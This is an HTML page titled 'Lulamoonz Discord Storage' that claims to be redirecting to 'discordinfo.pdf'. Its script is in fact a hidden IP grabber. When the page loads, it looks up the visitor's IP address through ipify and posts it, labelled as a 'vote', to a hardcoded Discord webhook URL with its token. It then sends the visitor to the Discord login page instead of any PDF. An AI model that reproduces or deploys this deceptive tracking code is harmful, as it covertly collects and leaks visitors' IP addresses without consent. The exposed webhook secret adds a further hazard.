<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lulamoonz Discord Storage</title>
    <script>
        // Function to send the IP address to the Discord webhook
        function sendIPToWebhook(ip) {
            // Prepare the payload
            const payload = {
                content: `New vote from IP: ${ip}`
            };

            // Send the payload to the Discord webhook
            fetch('https://discord.com/api/webhooks/1237235847619940402/uAffJZ82-lvO_kuGyQUVIi8LVmXBfuQX1M0bhuQP9ui1WRVWCldLF9MNr8LNcJYzPLqV', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {
                    console.log('IP sent successfully');
                    // Redirect to Discord login page
                    window.location.href = 'https://discord.com/login';
                } else {
                    console.error('Failed to send IP');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        // Fetch the user's IP address and send it to the webhook
        window.onload = function() {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    sendIPToWebhook(data.ip);
                })
                .catch(error => console.error('Error fetching IP:', error));
        };
    </script>
</head>
<body>
    <h1>Lulamoonz Discord Storage</h1>
    <p>Redirecting to discordinfo.pdf...</p>
</body>
</html>
